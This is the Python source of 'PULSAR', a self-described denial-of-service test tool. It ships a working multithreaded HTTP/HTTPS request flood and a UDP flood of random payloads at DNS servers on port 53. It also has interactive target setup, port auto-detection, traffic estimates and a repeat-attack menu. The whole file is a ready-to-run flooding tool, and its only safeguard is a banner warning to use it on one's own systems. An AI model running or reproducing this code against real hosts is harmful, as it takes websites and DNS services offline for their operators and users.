# PULSAR.py
# Copyright (c) 2025 SALOYEK
# Licensed under the MIT License. See LICENSE file for details.

import socket
import ssl
import threading
import time
import argparse
import sys
import random
import os
import re 

def set_console_title(title_text):
    if sys.platform == "win32":
        os.system(f"title {title_text}")
    else:
        sys.stdout.write(f"\x1b]2;{title_text}\x07")
        sys.stdout.flush()

PROGRAM_NAME = "PULSAR"
STOP_KEY_INFO = "ESC TO STOP" 
DNS_PORT = 53
DEFAULT_ATTACK_TYPE = "HTTPS"

try:
    import keyboard 
    KEYBOARD_AVAILABLE = True
except ImportError:
    KEYBOARD_AVAILABLE = False
    keyboard = None 

stop_event = threading.Event()
packets_sent = 0
bytes_sent = 0
user_interrupted_attack = False

class Colors:
    HEADER = '\033[95m'; OKBLUE = '\033[94m'; OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'; WARNING = '\033[93m'; FAIL = '\033[91m'
    ENDC = '\033[0m'; BOLD = '\033[1m'; UNDERLINE = '\033[4m'

LINE_SEP_CHAR = "═"
BOX_HLINE_CHAR = "─"
BOX_VLINE_CHAR = "│"
BOX_TOP_LEFT_CHAR = "╭"
BOX_TOP_RIGHT_CHAR = "╮"
BOX_BOTTOM_LEFT_CHAR = "╰"
BOX_BOTTOM_RIGHT_CHAR = "╯"

UI_WIDTH = 70 
LINE_SEP = Colors.OKBLUE + LINE_SEP_CHAR * UI_WIDTH + Colors.ENDC
BOX_HLINE_STRIPPED_FOR_BOX = BOX_HLINE_CHAR * (UI_WIDTH - 2) 

BANNER = f"""
{Colors.OKCYAN}{Colors.BOLD}
██████╗ ██╗   ██╗██╗     ███████╗ █████╗ ██████╗ 
██╔══██╗██║   ██║██║     ██╔════╝██╔══██╗██╔══██╗
██████╔╝██║   ██║██║     ███████╗███████║██████╔╝
██╔═══╝ ██║   ██║██║     ╚════██║██╔══██║██╔══██╗
██║     ╚██████╔╝███████╗███████║██║  ██║██║  ██║
╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
{Colors.ENDC}
       {Colors.OKGREEN}Simple Denial of Service Test Tool{Colors.ENDC}
"""
DEFAULT_THREADS_LOW_RESOURCE = 5 
DEFAULT_THREADS_NORMAL = 100

def strip_ansi_codes(text):
    return re.sub(r'\x1b\[([0-9,A-Z]{1,2}(;[0-9]{1,2})?(;[0-9]{1,2})?)?[m|K|H|f|J]', '', text)

def visible_len(text_with_ansi):
    return len(strip_ansi_codes(text_with_ansi))

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')
    current_stop_key_info = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Ctrl+C TO STOP"
    set_console_title(f"{PROGRAM_NAME} - {current_stop_key_info}")

def print_ui_header(text, color=Colors.OKCYAN):
    print(f"\n{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
    text_content = f"{color}{Colors.BOLD}{text}{Colors.ENDC}"
    content_visible_len = visible_len(text_content)
    innerWidth = UI_WIDTH - 2 
    padding_total = innerWidth - content_visible_len
    padding_left = padding_total // 2
    padding_right = padding_total - padding_left
    padding_left = max(0, padding_left); padding_right = max(0, padding_right)
    print(f"{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}{' ' * padding_left}{text_content}{' ' * padding_right}{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")

def print_boxed_line(content):
    available_width_for_content = UI_WIDTH - 4
    content_visible_len = visible_len(content)
    padding_right = available_width_for_content - content_visible_len
    padding_right = max(0, padding_right)
    print(f"{Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC} {content}{' ' * padding_right} {Colors.OKBLUE}{BOX_VLINE_CHAR}{Colors.ENDC}")

def print_boxed_key_value(key_text, value_text, key_color=Colors.OKBLUE, value_color=Colors.BOLD):
    label_width = 23 
    key_formatted = f"{key_color}{key_text:<{label_width}}{Colors.ENDC}"
    value_formatted = f"{value_color}{value_text}{Colors.ENDC}"
    line_content = f"{key_formatted} {value_formatted}"
    print_boxed_line(line_content)

def print_warning(text): print(f"{Colors.WARNING}│ [!] WARNING:{Colors.ENDC} {text}")
def print_info(text): print(f"{Colors.OKCYAN}│ [*] INFO:{Colors.ENDC} {text}")
def print_success(text): print(f"{Colors.OKGREEN}│ [+] SUCCESS:{Colors.ENDC} {text}")
def print_error(text): print(f"{Colors.FAIL}│ [X] ERROR:{Colors.ENDC} {text}")

def get_random_user_agent():
    return random.choice(["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", f"{PROGRAM_NAME} Agent/1.4"])

def format_size(num_bytes):
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if abs(num_bytes) < 1024.0: return f"{num_bytes:.2f} {unit}"
        num_bytes /= 1024.0
    return f"{num_bytes:.2f} PB"

def is_valid_ip(address):
    try: socket.inet_aton(address); return True
    except socket.error: return False

def attack_http_worker(target_ip, target_port, target_host_header, use_ssl):
    global packets_sent, bytes_sent
    path = f"/?{random.randint(1000, 99999)}"
    request_str = f"GET {path} HTTP/1.1\r\nHost: {target_host_header}\r\nUser-Agent: {get_random_user_agent()}\r\nAccept: */*\r\nConnection: close\r\n\r\n"
    request_bytes = request_str.encode('utf-8'); request_size = len(request_bytes)
    while not stop_event.is_set():
        conn = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock.settimeout(4) 
            if use_ssl: context = ssl.create_default_context(); conn = context.wrap_socket(sock, server_hostname=target_host_for_header)
            else: conn = sock
            conn.connect((target_ip, target_port)); conn.sendall(request_bytes)
            packets_sent += 1; bytes_sent += request_size
        except: pass 
        finally:
            if conn:
                try: conn.shutdown(socket.SHUT_RDWR); conn.close()
                except: pass

def attack_dns_worker(target_ip_dns):
    global packets_sent, bytes_sent
    payload = os.urandom(random.randint(32, 128)); payload_size = len(payload)
    while not stop_event.is_set():
        try:
            sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock_udp.sendto(payload, (target_ip_dns, DNS_PORT))
            packets_sent += 1; bytes_sent += payload_size; sock_udp.close()
        except: pass

def estimate_traffic(attack_type, target_input_for_est, port, num_threads, duration):
    print_ui_header("TRAFFIC ESTIMATION", Colors.OKCYAN)
    if attack_type == "DNS":
        print_info(f"Estimating for DNS (UDP Flood) on {target_input_for_est}:{DNS_PORT}...")
        avg_payload_size = (32 + 128) // 2
        assumed_pps_per_worker = 500 
        estimated_total_packets = num_threads * assumed_pps_per_worker * duration
        estimated_total_data_bytes = estimated_total_packets * avg_payload_size
        print(f"{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
        print_boxed_key_value("Avg. Payload Size", f"{avg_payload_size} B")
        print_boxed_key_value("Est. Total Packets", str(int(estimated_total_packets)))
        print_boxed_key_value("Est. Outgoing Traffic", format_size(estimated_total_data_bytes), value_color=f"{Colors.OKGREEN}{Colors.BOLD}")
        print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
        print_warning("This is a VERY ROUGH estimate for UDP flood."); return estimated_total_data_bytes, estimated_total_packets

    target_ip_for_est = None; target_host_for_header_est = target_input_for_est 
    if is_valid_ip(target_input_for_est): target_ip_for_est = target_input_for_est
    else:
        try: target_ip_for_est = socket.gethostbyname(target_input_for_est)
        except socket.gaierror: print_error(f"Could not resolve domain '{target_input_for_est}' for estimation."); return 0,0
    if not target_ip_for_est: print_error("Could not determine IP for estimation."); return 0,0
    print_info(f"Estimating for HTTP on {target_input_for_est}:{port}, {num_threads} threads, {duration}s...")
    use_ssl = (port == 443); path = f"/?{random.randint(1000, 99999)}"
    request_str = f"GET {path} HTTP/1.1\r\nHost: {target_host_for_header_est}\r\nUser-Agent: {get_random_user_agent()}\r\nConnection: close\r\n\r\n"
    single_request_size_bytes = len(request_str.encode('utf-8')); connections_per_sec_per_thread = 2.0; successful_connections = 0; total_time_for_test = 0.0
    num_test_connections = max(1, min(3, num_threads // 20 if num_threads > 0 else 1)) 
    if num_test_connections > 0:
        for _ in range(num_test_connections):
            start_conn_time = time.perf_counter()
            try:
                sock_test = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock_test.settimeout(2)
                if use_ssl: context_test = ssl.create_default_context(); conn_test = context_test.wrap_socket(sock_test, server_hostname=target_host_for_header_est)
                else: conn_test = sock_test
                conn_test.connect((target_ip_for_est, port)); conn_test.shutdown(socket.SHUT_RDWR); conn_test.close()
                end_conn_time = time.perf_counter(); total_time_for_test += (end_conn_time - start_conn_time); successful_connections += 1
            except: pass 
        if successful_connections > 0:
            avg_time_per_connection = total_time_for_test / successful_connections
            if avg_time_per_connection > 0.001: connections_per_sec_per_thread = 1.0 / avg_time_per_connection
            else: connections_per_sec_per_thread = 50.0 
            print_info(f"Avg. test conn time: {avg_time_per_connection:.4f}s | Est. conn/s/thread: {connections_per_sec_per_thread:.2f}")
        else: print_warning("Failed test connections for estimation. Using default rate.")
    connections_per_sec_per_thread = min(connections_per_sec_per_thread, 100.0); connections_per_sec_per_thread = max(connections_per_sec_per_thread, 0.5)
    estimated_total_requests = num_threads * connections_per_sec_per_thread * duration; estimated_total_data_bytes = estimated_total_requests * single_request_size_bytes
    print(f"{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
    print_boxed_key_value("Req. Size (payload)", f"{single_request_size_bytes} B")
    print_boxed_key_value("Est. Total Requests", str(int(estimated_total_requests)))
    print_boxed_key_value("Est. Outgoing Traffic", format_size(estimated_total_data_bytes), value_color=f"{Colors.OKGREEN}{Colors.BOLD}")
    print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
    print_warning("This is a VERY ROUGH estimate for HTTP."); print_warning("Does not include protocol overhead or server responses.")
    return estimated_total_data_bytes, estimated_total_requests

def get_interactive_input():
    clear_console(); print(BANNER)
    print_ui_header(f"{PROGRAM_NAME} INTERACTIVE SETUP")
    current_default_threads = DEFAULT_THREADS_LOW_RESOURCE if not KEYBOARD_AVAILABLE else DEFAULT_THREADS_NORMAL
    def get_styled_input(prompt_main, prompt_example="", default_value_text=""):
        full_prompt = f" {Colors.OKCYAN}❯ {prompt_main}:{Colors.ENDC} "
        if prompt_example: full_prompt += f"{Colors.OKBLUE}({prompt_example}){Colors.ENDC} "
        if default_value_text: full_prompt += f"[{Colors.OKGREEN}{default_value_text}{Colors.ENDC}] "
        try: return input(full_prompt).strip()
        except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting program."); sys.exit(1)

    attack_type_val = None
    while attack_type_val is None:
        raw_attack_type = get_styled_input("Choose attack type", "HTTPS or DNS").upper()
        if raw_attack_type == "HTTPS": attack_type_val = "HTTPS"; print_success(f"Attack type: {Colors.BOLD}HTTPS/HTTP (Web){Colors.ENDC}\n"); break
        elif raw_attack_type == "DNS": attack_type_val = "DNS"; print_success(f"Attack type: {Colors.BOLD}DNS (UDP Flood){Colors.ENDC}\n"); break
        else: print_warning("Invalid type. Choose HTTPS or DNS.")

    prompt_target = "Enter target domain/IP (for HTTPS)" if attack_type_val == "HTTPS" else "Enter target DNS Server IP"
    example_target = "e.g., example.com" if attack_type_val == "HTTPS" else "e.g., 192.168.1.1"
    target_input_val = "" 
    while not target_input_val:
        raw_target = get_styled_input(prompt_target, example_target)
        if not raw_target: print_warning("Target cannot be empty."); continue
        if attack_type_val == "DNS" and not is_valid_ip(raw_target): print_warning("For DNS attack, target must be an IP."); continue
        elif attack_type_val == "HTTPS" and "." not in raw_target and not all(c.isdigit() for c in raw_target): print_warning("Invalid HTTPS/HTTP target format."); continue
        target_input_val = raw_target
    print_success(f"Target set to: {Colors.BOLD}{target_input_val}{Colors.ENDC}\n")

    target_port_val = None
    if attack_type_val == "HTTPS":
        while target_port_val is None:
            raw_port = get_styled_input("Enter target port", "443, 80, empty for auto (tries 443 then 80)")
            if not raw_port: 
                print_info(f"Auto-detecting port for {Colors.BOLD}{target_input_val}{Colors.ENDC}...")
                port_443_successful = False
                try:
                    print_info("Testing port 443 (HTTPS)..."); 
                    s_test_ssl = socket.create_connection((target_input_val, 443), timeout=3) 
                    context_test = ssl.create_default_context()
                    server_hostname_for_ssl_test = target_input_val if not is_valid_ip(target_input_val) else None
                    conn_test_ssl = context_test.wrap_socket(s_test_ssl, server_hostname=server_hostname_for_ssl_test)
                    conn_test_ssl.close()
                    target_port_val=443; print_success(f"Auto-detected port: {Colors.BOLD}443 (HTTPS){Colors.ENDC}\n"); 
                    port_443_successful = True
                except (socket.timeout, ConnectionRefusedError, OSError) as e_net: print_warning(f"Port 443 test (network): {type(e_net).__name__}.")
                except ssl.SSLError as e_ssl: print_warning(f"Port 443 test (SSL): {type(e_ssl).__name__}. Might be open but with SSL/TLS issues.")
                except Exception as e_other: print_warning(f"Port 443 test (other): {type(e_other).__name__}.")
                if port_443_successful: break
                print_info("Testing port 80 (HTTP)..."); 
                try:
                    s_test_http=socket.create_connection((target_input_val,80), timeout=2); s_test_http.close()
                    target_port_val=80;print_success(f"Auto-detected port: {Colors.BOLD}80 (HTTP){Colors.ENDC}\n");break
                except Exception as e_http80: 
                    print_error(f"Port 80 test failed: {type(e_http80).__name__}.")
                    print_error(f"Could not auto-detect an open port. Please specify manually."); continue 
                if target_port_val is None: print_error("Auto-detection failed for both ports."); continue
            else:
                try:
                    port_val_int = int(raw_port)
                    if port_val_int not in [80, 443]: print_warning("Invalid port (only 80 or 443 for HTTPS/HTTP)."); continue
                    target_port_val = port_val_int
                    print_success(f"Port set to: {Colors.BOLD}{target_port_val}{Colors.ENDC}\n")
                except ValueError: print_warning("Not a valid port number.")
    else: 
        target_port_val = DNS_PORT 
        print_info(f"DNS attack will target port {Colors.BOLD}{DNS_PORT} (UDP){Colors.ENDC}\n")
    
    duration_val = None
    while duration_val is None:
        raw_duration = get_styled_input("Enter duration (seconds)", f"default: 60")
        if not raw_duration: duration_val = 60; print_success(f"Duration set to default: {Colors.BOLD}60s{Colors.ENDC}\n"); break
        try:
            duration_val_int = int(raw_duration)
            if duration_val_int <= 0: print_warning("Duration must be > 0."); continue
            duration_val = duration_val_int; print_success(f"Duration set to: {Colors.BOLD}{duration_val}s{Colors.ENDC}\n"); break
        except ValueError: print_warning("Not a valid number for duration.")

    num_threads_val = None
    while num_threads_val is None:
        raw_threads = get_styled_input("Enter number of threads/workers", f"default: {current_default_threads}")
        if not raw_threads: num_threads_val = current_default_threads; print_success(f"Threads set to default: {Colors.BOLD}{current_default_threads}{Colors.ENDC}\n"); break
        try:
            threads_val_int = int(raw_threads)
            if threads_val_int <= 0: print_warning("Threads must be > 0."); continue
            if threads_val_int > 5000: print_warning(f"Threads ({threads_val_int}) EXTREMELY high!")
            elif threads_val_int > 2000 and KEYBOARD_AVAILABLE: print_warning(f"Threads ({threads_val_int}) very high.")
            elif threads_val_int > 50 and not KEYBOARD_AVAILABLE: print_warning(f"Threads ({threads_val_int}) high for no-ESC env.")
            num_threads_val = threads_val_int; print_success(f"Threads set to: {Colors.BOLD}{num_threads_val}{Colors.ENDC}\n"); break
        except ValueError: print_warning("Not a valid number for threads.")
            
    return attack_type_val, target_input_val, target_port_val, duration_val, num_threads_val

def esc_listener_thread_func():
    global user_interrupted_attack, stop_event
    if KEYBOARD_AVAILABLE and keyboard:
        try:
            keyboard.wait('esc', suppress=True) 
            if not stop_event.is_set():
                print(f"\r{Colors.WARNING}{Colors.BOLD}ESC key detected!{Colors.ENDC} Stopping attack...                                        ")
                user_interrupted_attack = True; stop_event.set()
        except Exception: pass

def run_attack(attack_type, target_input_val, target_port_val, duration_val, num_threads_val):
    global packets_sent, bytes_sent, stop_event, user_interrupted_attack
    packets_sent = 0; bytes_sent = 0; stop_event.clear(); user_interrupted_attack = False
    current_stop_key = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Ctrl+C TO STOP"
    attack_desc = f"{attack_type} on {target_input_val}" + (f":{target_port_val}" if attack_type == "HTTPS" else f":{DNS_PORT}(UDP)")
    current_attack_title = f"{PROGRAM_NAME} - {attack_desc} - {current_stop_key}"
    set_console_title(current_attack_title)
    print_ui_header("ATTACK CONFIGURATION", Colors.OKGREEN)
    print(f"{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
    print_boxed_key_value("Attack Type:", attack_type)
    print_boxed_key_value("Target:", target_input_val)
    print_boxed_key_value("Port:", str(target_port_val) if attack_type == "HTTPS" else f"{DNS_PORT} (UDP)")
    print_boxed_key_value("Duration:", f"{duration_val} seconds")
    print_boxed_key_value("Workers:", str(num_threads_val))
    print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}\n")
    target_ip_to_connect = None; target_host_for_header = target_input_val; target_dns_server_ip = None
    if attack_type == "HTTPS":
        if is_valid_ip(target_input_val): target_ip_to_connect = target_input_val; print_info(f"Target '{target_input_val}' is an IP.")
        else:
            print_info(f"Target '{target_input_val}' is domain. Resolving...");
            try: target_ip_to_connect = socket.gethostbyname(target_input_val); print_success(f"Resolved to IP: {target_ip_to_connect}")
            except socket.gaierror as e: print_error(f"Resolve failed: {e}"); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return False 
        if not target_ip_to_connect: print_error("Could not get IP."); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return False
    elif attack_type == "DNS": target_dns_server_ip = target_input_val; print_info(f"DNS Flood target IP: {target_dns_server_ip}")
    estimate_traffic(attack_type, target_input_val, target_port_val, num_threads_val, duration_val)
    try:
        confirm_prompt = f" {Colors.WARNING}│ [?] START ATTACK?{Colors.ENDC} ({Colors.OKGREEN}YES{Colors.ENDC}/{Colors.FAIL}NO{Colors.ENDC}): "
        confirm = input(confirm_prompt).strip().upper()
        if confirm != 'YES': print_info("Attack cancelled."); set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); return "cancelled"
    except KeyboardInterrupt: print_error("\nInput interrupted. Exiting."); sys.exit(1)
    use_ssl_for_http = (target_port_val == 443) if attack_type == "HTTPS" else False
    print_ui_header("ATTACK IN PROGRESS", Colors.FAIL)
    display_target = target_dns_server_ip if attack_type == "DNS" else f"{target_ip_to_connect}:{target_port_val}"
    print_info(f"Type: {Colors.BOLD}{attack_type}{Colors.ENDC} | Target: {Colors.BOLD}{display_target}{Colors.ENDC} | Duration: {Colors.BOLD}{duration_val}{Colors.ENDC}s...")
    listener_thread_obj = None
    if KEYBOARD_AVAILABLE: 
        print_info(f"Press {Colors.BOLD}ESC{Colors.ENDC} to stop early.")
        listener_thread_obj = threading.Thread(target=esc_listener_thread_func, daemon=True); listener_thread_obj.start()
    else: print_info(f"Press {Colors.BOLD}Ctrl+C{Colors.ENDC} to stop attack (ESC disabled).")
    threads_list = []; start_time = time.perf_counter()
    for _ in range(num_threads_val):
        if attack_type == "HTTPS": worker_func = attack_http_worker; worker_args = (target_ip_to_connect, target_port_val, target_host_for_header, use_ssl_for_http)
        elif attack_type == "DNS": worker_func = attack_dns_worker; worker_args = (target_dns_server_ip,)
        else: continue
        thread = threading.Thread(target=worker_func, args=worker_args); threads_list.append(thread); thread.daemon = True; thread.start()
    try:
        progress_bar_fixed_width = 25 
        while True:
            elapsed_time = time.perf_counter() - start_time
            if elapsed_time >= duration_val or stop_event.is_set(): break 
            current_bytes_val = bytes_sent; current_packets_val = packets_sent
            bytes_per_sec = current_bytes_val / elapsed_time if elapsed_time > 0 else 0
            packets_per_sec = current_packets_val / elapsed_time if elapsed_time > 0 else 0
            progress = min(1.0, elapsed_time / duration_val); filled_length = int(progress_bar_fixed_width * progress)
            bar = '█' * filled_length + '-' * (progress_bar_fixed_width - filled_length)
            progress_text = f"{Colors.OKCYAN}Progress{Colors.ENDC}: [{Colors.OKGREEN}{bar}{Colors.ENDC}] {progress*100:.1f}%"
            time_text = f"{Colors.BOLD}{elapsed_time:.1f}s{Colors.ENDC}/{duration_val}s"
            sent_text = f"Sent: {Colors.BOLD}{format_size(current_bytes_val)}{Colors.ENDC} ({current_packets_val} pkts)"
            speed_text = f"Speed: {Colors.BOLD}{format_size(bytes_per_sec)}/s{Colors.ENDC} ({packets_per_sec:.0f} pps)"
            status_line_content = f"{progress_text} | {time_text} | {sent_text} | {speed_text}"
            padding = UI_WIDTH - (visible_len(status_line_content)) -1 ; padding = max(0, padding)
            sys.stdout.write(f"\r{status_line_content}{' ' * padding}"); sys.stdout.flush(); time.sleep(0.1)
        if not stop_event.is_set() and not user_interrupted_attack: sys.stdout.write("\n"); print_info("Test duration elapsed.")
    except KeyboardInterrupt:
        if not KEYBOARD_AVAILABLE or not listener_thread_obj or not listener_thread_obj.is_alive():
            sys.stdout.write("\n"); print_warning("\nAttack interrupted (Ctrl+C)... Stopping."); user_interrupted_attack = True
            if not stop_event.is_set(): stop_event.set()
        else: sys.stdout.write("\n"); print_warning(f"\n(Ctrl+C during attack. Press {Colors.BOLD}ESC{Colors.ENDC} to stop.)"); pass 
    finally:
        set_console_title(f"{PROGRAM_NAME} - {current_stop_key}"); 
        if not (not stop_event.is_set() and not user_interrupted_attack and elapsed_time >= duration_val):
             if not user_interrupted_attack or (KEYBOARD_AVAILABLE and listener_thread_obj and listener_thread_obj.is_alive()):
                 sys.stdout.write("\n")
        sys.stdout.flush()
        if not stop_event.is_set(): stop_event.set() 
        print_info("Waiting for workers to finish..."); time.sleep(0.5)
        final_elapsed_time = time.perf_counter() - start_time
        print_ui_header("ATTACK RESULTS", Colors.OKGREEN)
        print(f"{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
        print_boxed_key_value("Attack Type:", attack_type)
        print_boxed_key_value("Actual Duration:", f"{final_elapsed_time:.2f} seconds")
        print_boxed_key_value("Packets/Requests:", str(packets_sent))
        print_boxed_key_value("Data Sent:", format_size(bytes_sent))
        if final_elapsed_time > 0:
            avg_bps = bytes_sent / final_elapsed_time; avg_pps = packets_sent / final_elapsed_time
            print_boxed_key_value("Average Speed:", f"{format_size(avg_bps)}/s ({avg_pps:.0f} pps)")
        print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
        if user_interrupted_attack: 
            interrupt_method = "ESC" 
            if not (KEYBOARD_AVAILABLE and listener_thread_obj and not stop_event.is_set() and user_interrupted_attack):
                 if stop_event.is_set(): interrupt_method = "Ctrl+C"
            print_warning(f"Interrupted by user {interrupt_method}.")
        print_success(f"--- {Colors.BOLD}{PROGRAM_NAME} Attack Finished{Colors.ENDC} ---\n")
    return True

def main():
    is_color_supported = sys.stdout.isatty()
    if sys.platform == "win32":
        try: import ctypes; kernel32 = ctypes.windll.kernel32; kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7); is_color_supported = True
        except: is_color_supported = False 
    if not is_color_supported:
        for attr in dir(Colors):
            if attr.isupper(): setattr(Colors, attr, "")
    if not KEYBOARD_AVAILABLE:
        print(f"{Colors.WARNING}[!] Lib 'keyboard' not installed. ESC disabled.{Colors.ENDC}")
        print(f"{Colors.WARNING}Install: pip install keyboard. Use Ctrl+C to stop attack.{Colors.ENDC}")
        try: input(f"{Colors.OKGREEN}Press Enter to continue...{Colors.ENDC}")
        except KeyboardInterrupt: print_error("\nExiting."); sys.exit(1)
    clear_console(); print(BANNER)
    print_warning("USE RESPONSIBLY AND ONLY ON YOUR OWN SYSTEMS!"); print_warning("Misuse is ILLEGAL.")
    parser = argparse.ArgumentParser(description=f"{Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC} - DoS Test Tool.", epilog="Use responsibly!", formatter_class=argparse.RawTextHelpFormatter )
    parser.add_argument("target", nargs='?', help="Target domain or IP"); 
    parser.add_argument("port", nargs='?', type=int, help="Port (443, 80 for HTTPS)") 
    parser.add_argument("duration", nargs='?', type=int, help="Duration (s)"); 
    parser.add_argument("-t", "--threads", type=int, default=None, help="Number of threads/workers")
    parser.add_argument("-i", "--interactive", action="store_true", help="Interactive mode")
    parser.add_argument("--attack_type", choices=['HTTPS', 'DNS'], default=None, help="Type of attack: HTTPS or DNS") 
    args = parser.parse_args()
    last_target = None; last_port = None; last_duration = None; last_threads = None; last_attack_type = args.attack_type
    cli_args_processed = False; get_new_params = True
    while True: 
        if get_new_params:
            if not cli_args_processed and not args.interactive and args.target and args.duration and args.attack_type:
                if args.attack_type == "HTTPS" and args.port is None: print_error("Port required for HTTPS CLI attack."); sys.exit(1)
                elif args.attack_type == "DNS" and not is_valid_ip(args.target): print_error("DNS CLI target must be IP."); sys.exit(1)
                print_info("Using CLI parameters..."); 
                attack_type, target, duration = args.attack_type, args.target, args.duration
                port = args.port if args.attack_type == "HTTPS" else DNS_PORT
                threads = args.threads if args.threads and args.threads > 0 else (DEFAULT_THREADS_LOW_RESOURCE if not KEYBOARD_AVAILABLE else DEFAULT_THREADS_NORMAL)
                if threads > 5000: print_warning(f"CLI Workers ({threads}) EXTREMELY high...")
                elif threads > 2000 and KEYBOARD_AVAILABLE: print_warning(f"CLI Workers ({threads}) very high...")
                elif threads > 50 and not KEYBOARD_AVAILABLE: print_warning(f"CLI Workers ({threads}) high for no-ESC env.")
                last_target, last_port, last_duration, last_threads, last_attack_type = target, port, duration, threads, attack_type
                cli_args_processed = True
            else:
                if last_target and get_new_params : clear_console(); print(BANNER) 
                attack_type, target, port, duration, threads = get_interactive_input()
                last_target, last_port, last_duration, last_threads, last_attack_type = target, port, duration, threads, attack_type
        get_new_params = True 
        attack_result = run_attack(last_attack_type, last_target, last_port, last_duration, last_threads)
        if attack_result == "cancelled": pass
        while True:
            print_ui_header("WHAT NEXT?", Colors.OKGREEN)
            repeat_desc = f"Repeat last {last_attack_type} attack ({Colors.BOLD}{last_target}"
            if last_attack_type == "HTTPS": repeat_desc += f":{last_port}"
            else: repeat_desc += f":{DNS_PORT}(UDP)"
            repeat_desc += f"{Colors.ENDC}, {last_threads} workers)"
            menu_options = [repeat_desc, "Start a new attack (new settings)", "Close program"]
            print(f"{Colors.OKBLUE}{BOX_TOP_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_TOP_RIGHT_CHAR}{Colors.ENDC}")
            for i, option in enumerate(menu_options):
                print_boxed_line(f" {Colors.OKCYAN}[{i+1}]{Colors.ENDC} {option}")
            print(f"{Colors.OKBLUE}{BOX_BOTTOM_LEFT_CHAR}{BOX_HLINE_STRIPPED_FOR_BOX}{BOX_BOTTOM_RIGHT_CHAR}{Colors.ENDC}")
            try:
                choice = input(f" {Colors.OKGREEN}❯ Your choice (1-3): {Colors.ENDC}").strip()
                if choice == '1': clear_console(); print(BANNER); get_new_params = False; break 
                elif choice == '2': get_new_params = True; break 
                elif choice == '3': print_info(f"Thank you for using {Colors.BOLD}{PROGRAM_NAME}{Colors.ENDC}. Closing..."); sys.exit(0)
                else: print_warning("Invalid choice.")
            except KeyboardInterrupt: print_error("\nInput interrupted (Ctrl+C). Exiting program."); sys.exit(1)
        
if __name__ == "__main__":
    try: main()
    except SystemExit: pass
    except Exception as e: print_error(f"Unexpected global error: {type(e).__name__} - {e}")
    finally:
        if KEYBOARD_AVAILABLE and keyboard:
            try: keyboard.unhook_all() 
            except: pass
        current_stop_key = STOP_KEY_INFO if KEYBOARD_AVAILABLE else "Console"
        if sys.platform == "win32": os.system(f"title {current_stop_key}") 
        else: sys.stdout.write(f"\x1b]2;{current_stop_key}\x07"); sys.stdout.flush()
        print(Colors.ENDC)
